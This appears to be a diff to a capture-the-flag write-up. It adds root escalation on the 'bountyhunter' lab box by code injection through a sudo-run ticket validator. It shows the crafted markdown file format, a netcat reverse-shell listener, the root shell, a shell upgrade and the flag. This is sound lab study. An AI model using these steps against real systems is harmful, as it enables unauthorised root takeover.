@@ -239,6 +239,57 @@ User development may run the following commands on bountyhunter:
     (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
 ```
 
+- Take a look at [ticketValidator.py](./ssh/ticketValidator.py)
+
+=> To make the eval result to be `True`, need: 
+
+```
+Must be ext .md file
+#1          "# Skytrain Inc"
+#2          "## Ticket to "
+#3+         "__Ticket Code:__"
+#3+ + 1     "r'\*\*[0-9][0-9\+]*[0-9](\*\*)?'" (first number as code, and result as expression)
+code % 7 == 4 && result > 100
+```
+
+- Embedding [python code](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python) to [md file](./ssh/root.md), and reverse shell by local site
+
+### Victim (Need to create a md file)
+
+> sudo python3.8 /opt/skytrain_inc/ticketValidator.py
+
+```
+Please enter the path to the ticket file.
+root.md
+Destination: whatever you like
+```
+
+### Attacker
+
+> nc -lvnp 8080
+
+```
+listening on [any] 8080 ...
+connect to [10.10.14.46] from (UNKNOWN) [10.10.11.100] 56702
+```
+
+> whoami 
+
+```
+root
+```
+
+- Change to interactive shell
+
+> /usr/bin/script -qc /bin/bash /dev/null
+
+```
+root.txt
+6aee2773b241427c021ff4140918a031
+```
+
+## Else
+
 - contract.txt
 
 ```
@@ -253,4 +304,4 @@ I set up the permissions for you to test this. Good luck.
 -- John
 ```
 
-
+=> Not important
